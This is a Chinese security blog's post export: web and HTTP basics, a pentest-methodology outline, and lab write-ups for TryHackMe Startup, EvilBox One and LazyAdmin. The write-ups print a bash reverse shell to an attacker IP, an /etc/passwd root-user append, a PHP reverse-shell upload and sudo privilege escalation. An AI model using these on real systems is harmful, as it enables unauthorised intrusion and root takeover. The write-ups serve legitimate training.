<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>渗透测试基础</title>
    <link href="/2024/08/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/08/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="法律条文"><a href="#法律条文" class="headerlink" title="法律条文"></a>法律条文</h1><p><a href="http://www.npc.gov.cn/zgrdw/npc/xinwen/2016-11/07/content_2001605.htm">中华人民共和国网络安全法_中国人大网 (npc.gov.cn)</a><br>2016年11月7日，《中华人民共和国网络安全法》颁布以来，一切非授权的渗透测试行为都是违法的。</p><h1 id="WEB服务端"><a href="#WEB服务端" class="headerlink" title="WEB服务端"></a>WEB服务端</h1><h2 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a>静态网页</h2><p>即以.htm，.html为后缀的网页，通常由html+CSS+javascript构成，通过前台渲染解析<br>如我的博客<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062005353.png" alt="image.png"></p><p>虽然在网址上没有看到html结尾，事实上访问的其实是一个index.html文件<br>访问<br><code>https://susec.xyz/2024/06/12/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY1-kenobi/</code><br>跟访问<br><code>https://susec.xyz/2024/06/12/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY1-kenobi/index.html</code><br>其实是一样的</p><p>静态网站很容易被别人拿去直接用<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062008061.png" alt="image.png"><br>在网页上按ctrl+s就能直接保存到本地了<br>静态网站每次更新都要连接服务器把新的网页传上去，比较麻烦<br>搭建如图所示网站<br>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello World<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062041759.png" alt="image.png"><br>可见静态网站我们可以直接看到源代码</p><h2 id="动态网站"><a href="#动态网站" class="headerlink" title="动态网站"></a>动态网站</h2><p>常见架构</p><ul><li>LNMP:Linux,Nginx,Mysql,PHP</li><li>LAMP:Linux,Apache,Mysql,PHP<br>动态网站的搭建就跟前面靶场搭建差不多，可以参考<br><a href="https://susec.xyz/2024/08/01/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">https://susec.xyz/2024/08/01/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</a></li></ul><p>访问本地网站我们用127.0.0.1或是localhost的80端口，因为网站默认端口一般是80<br>127.0.0.1跟localhost是一个意思的原因在hosts文件里（C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts）<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062137701.png" alt="image.png"></p><p>可以看到127.0.0.1指向的是localhost</p><p>动态源代码如php，java这种，当我们打开网站就无法看到源代码，如下案例<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062133317.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062134251.png" alt="image.png"></p><h1 id="URL与URL编码"><a href="#URL与URL编码" class="headerlink" title="URL与URL编码"></a>URL与URL编码</h1><p>URL:统一资源定位符，通俗称为网址<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062107502.png" alt="image.png"><br>一般由这几部分组成<br>Scheme：协议，一般有http,https,ftp,file，mailto等<br>Domain Name：域名，一般也叫hostname，一般是填入域名或ip地址<br>Port：端口，一般http默认就是80，https默认就是443，这两个不会显示，别的端口会显示，但是也存在端口映射能把别的端口映射到80端口的情况<br>Path：资源所在路径<br>Parameters：数据<br>Anchor：描点</p><p>协议中：<br>file协议，可以直接打开对应的磁盘目录</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062137042.png" alt="image.png"></p><p>描点可能不这么常见，但例如在我的博客中<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408071054292.png" alt="image.png"><br>点击目录下的对应内容，url就会出现描点</p><h2 id="常见URL编码"><a href="#常见URL编码" class="headerlink" title="常见URL编码"></a>常见URL编码</h2><p>常见的编码还是要记一下，提高效率</p><table><thead><tr><th>字符</th><th>编码</th></tr></thead><tbody><tr><td>&#x3D;</td><td>%3d</td></tr><tr><td>#</td><td>%23</td></tr><tr><td>%</td><td>%25</td></tr><tr><td>&amp;</td><td>%26</td></tr><tr><td>&#x2F;</td><td>%2f</td></tr><tr><td>空格</td><td>%20</td></tr><tr><td>换行</td><td>%0a</td></tr><tr><td>空字节</td><td>%00</td></tr></tbody></table><h1 id="HTTP协议与抓包"><a href="#HTTP协议与抓包" class="headerlink" title="HTTP协议与抓包"></a>HTTP协议与抓包</h1><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><strong>HTTP</strong> 是一种用作获取诸如 HTML 文档这类资源的协议。它是 Web 上进行任何数据交换的基础，同时，也是一种客户端—服务器（client-server）协议，也就是说，请求是由接受方——通常是 Web 浏览器——发起的。完整网页文档通常由文本、布局描述、图片、视频、脚本等资源构成。</p><h3 id="HTTP请求组成"><a href="#HTTP请求组成" class="headerlink" title="HTTP请求组成"></a>HTTP请求组成</h3><p>HTTP请求报文由请求行，请求头部，空行和请求数据4个部分组成<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408071634675.png" alt="image.png"></p><h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>请求行由请求方法，URL，HTTP协议版本三个字段组成，它们用空格分隔</p><h5 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h5><p>GET,POST,HEAD,PUT,DELETE,OPTIONS,TRACE,CONNECT</p><h6 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h6><p>GET是最常用的方法。通常用于请求服务器发送某个资源。GET请求中，查询字符串是在URL中发送的<br>，而且URL是存在长度限制的，所以GET请求所传递的数据是有限的</p><h6 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h6><p>POST方法起初是用来向服务器输入数据的。实际上，通常会用它来支持HTML的表单。表单中填好的数据通常会被送给服务器，然后由服务器将其发送到它要去的地方。<br>在POST请求中，查询字符串是在请求数据中发送的，原则上POST请求的数据是没有大小限制的</p><h4 id="请求头部"><a href="#请求头部" class="headerlink" title="请求头部"></a>请求头部</h4><ul><li>HOST：指定被请求资源的主机名</li><li>User-Agent：产生请求的浏览器类型</li><li>Referer：当前访问URL的上一个URL，即用户从哪来</li><li>Cookie：存放着用户的身份凭证</li><li>X-Forward-For：XFF头，代表请求端IP地址</li><li>Accept：用户生命客户端可处理的MIME类型</li><li>Accept-Encoding：用于声明客户端能够理解的内容编码方式</li><li>Accept-Language：用于声明客户端可以理解的自然语言</li></ul><h3 id="HTTP响应组成"><a href="#HTTP响应组成" class="headerlink" title="HTTP响应组成"></a>HTTP响应组成</h3><p>HTTP响应报文由状态行，消息报头，空行，响应正文组成<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408071649099.png" alt="image.png"></p><h4 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h4><p>状态行由HTTP协议版本，状态码和状态描述组成</p><h5 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h5><table><thead><tr><th>状态码</th><th>描述</th></tr></thead><tbody><tr><td>1xx</td><td>指示信息，表示请求已接收，继续处理</td></tr><tr><td>2xx</td><td>成功，表示请求已被成功接收，理解，接受</td></tr><tr><td>3xx</td><td>重定向，要完成请求必须进行更进一步的操作</td></tr><tr><td>4xx</td><td>客户端错误，请求有语法错误或请求无法实现</td></tr><tr><td>5xx</td><td>服务端粗无，服务器未能实现</td></tr><tr><td>常见状态码描述</td><td></td></tr></tbody></table><table><thead><tr><th>状态码</th><th>原因短语</th><th>含义</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>客户端请求成功，没有问题</td></tr><tr><td>302</td><td>Found</td><td>重定向，客户端应该使用Location首部给出的URL来临时定位资源</td></tr><tr><td>304</td><td>Not Modified</td><td>直接使用本地缓存</td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求有语法错误，不能被服务器所理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求未经授权认证</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器收到请求，但是拒绝提供服务，访问一个网站常出现这种情况</td></tr><tr><td>404</td><td>Not Found</td><td>请求资源不存在</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>发请求中带有所请求的方法不允许</td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器发生不可预期的错误</td></tr><tr><td>502</td><td>Bad Gateway</td><td>无法连接到其父网关</td></tr><tr><td>503</td><td>Service Unavailable</td><td>服务器当前不能处理客户端的请求</td></tr></tbody></table><h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><p>HTTPS&#x3D;HTTP+SSL&#x2F;TLS<br>HTTPS通过安全传输机制进行传输数据，可以保护网络传送的所有数据的隐秘性和完整性。</p><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>常见抓包工具<br>Burp<br>这篇文章详细描述了安装方法<br><a href="https://susec.xyz/2024/06/16/%E6%8C%96%E6%B4%9E%E5%89%8D%E7%BD%AE-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">https://susec.xyz/2024/06/16/%E6%8C%96%E6%B4%9E%E5%89%8D%E7%BD%AE-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</a><br>yakit<br>国产工具，我比较喜欢这个<br>fiddler<br>见过一些大佬用，我不怎么熟悉 </p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY9-Startup</title>
    <link href="/2024/08/06/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY9-startup/"/>
    <url>/2024/08/06/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY9-startup/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY10-Startup"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY10-Startup" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY10-Startup"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY10-Startup</h1><p><a href="https://tryhackme.com/r/room/startup">尝试黑客 |启动 — TryHackMe | Startup</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258808.png" alt="image-20240402122613116"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258820.png" alt="image-20240402123448476"></p><p>先进行简单的目录扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258838.png" alt="image-20240402123630157"></p><p>看到有匿名登录，先试试</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258822.png" alt="image-20240402123937145"></p><p>get这两个把他们弄下来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258823.png" alt="image-20240402124207541"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258826.png" alt="image-20240402124228699"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258239.png" alt="image-20240402124253385"></p><p>emmm，好像没什么用</p><p>先看看他的80端口什么情况</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258348.png" alt="image-20240403083208971"></p><p>打开网站</p><p>目录扫描也没有得到什么</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258416.png" alt="image-20240403083747285"></p><p>就一个files，里面的文件就是ftp的文件</p><p>这就说明我们可以通过ftp上传文件并且在http服务上激活，这跟昨天的lazyadmin有异曲同工之妙</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258582.png" alt="image-20240403084404301"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258682.png" alt="image-20240403084415770"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258847.png" alt="image-20240403084427583"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258871.png" alt="image-20240403084558901"></p><p>看到一个recipe.txt，不出意外这就是秘方</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258924.png" alt="image-20240403084702351"></p><p>it was love</p><p>根据刚才的目录，我们只对另一个文件夹&#x2F;incidents有权限，进去看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258965.png" alt="image-20240403085257635"></p><p>有一个pcapng文件，也就是网络数据包</p><p>把它放到ftp上再获取</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258996.png" alt="image-20240403090034827"></p><p>通过wireshark进行分析</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258078.png" alt="image-20240403090227775"></p><p>有很多的4444</p><p>右键-&gt;follow-&gt;tcp stream</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258148.png" alt="image-20240403090533052"></p><p>显而易见</p><p>username:lennie</p><p>password:c4ntg3t3n0ughsp1c3</p><p>通过ssh连接</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258251.png" alt="image-20240403090807149"></p><p>成功</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258307.png" alt="image-20240403090848768"></p><p>再看看scripts，只有这个是要root的，有明显不同</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258342.png" alt="image-20240403092316630"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258749.png" alt="image-20240403092349180"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258838.png" alt="image-20240403092508823"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258915.png" alt="image-20240403092641243"></p><p>找到print.sh，可以有lennie运行，所以我们只需要修改它的内容变为反弹shell即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.13.54.129/</span><span class="hljs-number">7777</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>再触发（改了之后他好像就会自动触发，只要你监听就会变成root）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258969.png" alt="image-20240403092938032"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258022.png" alt="image-20240403093236419"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EVILBOX_ONE</title>
    <link href="/2024/08/05/vulhub%E9%9D%B6%E5%9C%BA-EVILBOX_ONE/"/>
    <url>/2024/08/05/vulhub%E9%9D%B6%E5%9C%BA-EVILBOX_ONE/</url>
    
    <content type="html"><![CDATA[<h1 id="EVILBOX-ONE"><a href="#EVILBOX-ONE" class="headerlink" title="EVILBOX_ONE"></a>EVILBOX_ONE</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050940027.png" alt="image-20240428212325300"></p><p>先是扫出22，80端口</p><p>然后扫描80找到&#x2F;robots.txt和secret，逐个访问下看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050940098.png" alt="image-20240430145035766"></p><p>这里给了个信息，我们的用户名可能是H4x0r</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050940017.png" alt="image-20240430145328132"></p><p>一片空白</p><p>那我们选用最蠢的办法，hydra爆破一下</p><p>爆破不出来，这里我们怀疑前面是不是字典不够大，没跑完</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941372.png" alt="image-20240430161102218"></p><p>（kali的dirsearch跑不出来，gobuster出问题，这里直接使用本机御剑跑）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941452.png" alt="image-20240430163036480"></p><p>跑跑参数</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941755.png" alt="image-20240430163050439"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941704.png" alt="image-20240430163702002"></p><p>（也可以如上图）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941034.png" alt="image-20240430163249795"></p><p>这里看到个用户mowree</p><p>看看能不能得到公链或私链</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941789.png" alt="image-20240430164717167"></p><p>公钥无法访问，但是能得到私钥</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941628.png" alt="image-20240430164949403"></p><p>爆破出密码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941011.png" alt="image-20240430165556325"></p><p>拿到第一个flag</p><p><strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</strong></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941302.png" alt="image-20240430172244175"></p><p>直接上脚本找提权点，发现&#x2F;etc&#x2F;passwd可修改，直接上</p><p>echo “test:advwtv&#x2F;9yU5yQ:0:0:,,,:&#x2F;root:&#x2F;bin&#x2F;bash” &gt;&gt;&#x2F;etc&#x2F;passwd</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941431.png" alt="image-20240430173646149"></p><p>提权成功</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941583.png" alt="image-20240430173736901"></p><p>完成</p><p>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY8-Lazy Admin</title>
    <link href="/2024/08/04/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY8-Lazy%20Admin/"/>
    <url>/2024/08/04/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY8-Lazy%20Admin/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY8-Lazy-Admin"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY8-Lazy-Admin" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY8-Lazy Admin"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY8-Lazy Admin</h1><p><a href="https://tryhackme.com/r/room/lazyadmin">特里哈克梅 |懒惰的admin — TryHackMe | LazyAdmin</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154383.png" alt="image-20240401151831766"></p><p>只扫描出22，80两个端口</p><p>但是都没有什么有用信息</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154413.png" alt="image-20240401153122834"></p><p>扫目录看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154410.png" alt="image-20240402083518327"></p><p>打开content</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154421.png" alt="image-20240402083505524"></p><p>可以看到这是一个叫做SweetRice的CMS</p><p>继续目录扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154419.png" alt="image-20240402083725480"></p><p>可以看到一个主题页，日志页，图片页，还有登陆页面等等，这里逐个看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154428.png" alt="image-20240402083839964"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154887.png" alt="image-20240402083853435"></p><p>这些文件随便点开几个都是空白，暂时不管他</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154003.png" alt="image-20240402083956631"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154199.png" alt="image-20240402084037160"></p><p>随便看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154254.png" alt="image-20240402084256255"></p><p>在这里有一个序列化过的字符串，可以看出这是一个被加密的密码，我们进行解密</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154375.png" alt="image-20240402084403711"></p><p>得到了密码</p><p>那我们直接去登陆看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154437.png" alt="image-20240402084646617"></p><p>打开发现根本不能登录，这里怀疑是不是没扫出来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154515.png" alt="image-20240402091307697"></p><p>扫到一个as，打开一看果然是登陆界面</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154540.png" alt="image-20240402091337907"></p><p>用上我们刚才找到的用户名密码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154830.png" alt="image-20240402091433142"></p><p>成功进入后台</p><p>这里记录下关键信息</p><p>这是sweetrice 1.5.1</p><p>然后插件列表处有个可以文件上传的点</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154952.png" alt="image-20240402091856220"></p><p>这里我们先看看这个cms有没有什么漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154974.png" alt="image-20240402091949839"></p><p>可以看到有文件上传，文件下载，csrf的洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154013.png" alt="image-20240402092221470"></p><p>我们把poc下载下来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154044.png" alt="image-20240402092245333"></p><p>看看代码，要求我们填网址，账号密码，还有要上传的文件</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154111.png" alt="image-20240402093259558"></p><p>不知道为什么上传不上去，换个办法</p><p>在网上找了个反弹shell</p><p><a href="https://blog.csdn.net/Aluxian_/article/details/133470236">反弹shell脚本（php-reverse-shell）_php-reverse-shell.-CSDN博客</a></p><p>改一下ip，端口即可</p><p>然后自己上传</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154483.png" alt="image-20240402094053009"></p><p>然后到&#x2F;content&#x2F;inc&#x2F;ads点一下触发</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154510.png" alt="image-20240402094131962"></p><p>成功进入</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154598.png" alt="image-20240402093931706"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154624.png" alt="image-20240402094157096"></p><p>find | grep user</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154645.png" alt="image-20240402094303909"></p><p>拿到第一个flag，后面就是进行提权</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154698.png" alt="image-20240402094421456"></p><p>发现我们只有两个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154067.png" alt="image-20240402114835268"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154069.png" alt="image-20240402122205157"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; /etc/<span class="hljs-keyword">copy</span>.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/perl /</span>home<span class="hljs-regexp">/itguy/</span>backup.pl<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154089.png" alt="image-20240402122432777"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154108.png" alt="image-20240402122413914"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试(一)</title>
    <link href="/2024/08/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/"/>
    <url>/2024/08/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试-一"><a href="#渗透测试-一" class="headerlink" title="渗透测试(一)"></a>渗透测试(一)</h1><p><strong>渗透测试流程</strong></p><p>渗透测试的整体流程：</p><ol><li>确定目标，方案（大多时候渗透测试是团队作战，有一个好的配合与方案才能事半功倍）</li><li>信息收集（好的信息收集能让渗透测试事半功倍）</li><li>WEB打点（根据前面收集好的信息进行漏洞利用并getshell）</li><li>后渗透（也就是内网阶段，内网又有内网的信息收集，横向移动等等）</li><li>痕迹清楚（你也不想被发现吧）</li><li>报告编写（最后的总结）</li></ol><h1 id="一-确定目标"><a href="#一-确定目标" class="headerlink" title="一.确定目标"></a>一.确定目标</h1><p>要针对下发的攻击手册研究主要得分点</p><p>个人电脑卫生，防止溯源</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二. 信息收集"></a>二. 信息收集</h1><h2 id="1-总起"><a href="#1-总起" class="headerlink" title="1. 总起"></a>1. 总起</h2><p>我们首先要理解信息收集的重要性<br>还有就是我们刚开始做的时候可能对着主域名xxx.com就开打了，这个很明显是不现实的，这种核心资产它的防御肯定是最好的，我们很可能打半天一点成果都没有，我们要抱着目的去做信息收集，我们做的是渗透测试，要测的是薄弱点，最薄弱的几乎都是边缘资产，但是边缘资产又不可能像主站那样一搜就出来，因此，我们要做信息收集。</p><p>一般来说，如果是参加攻防演练，会分发一个攻击方手册，上面会写出具体攻击的靶标单位是哪些，然后上面会给出防守方 ip 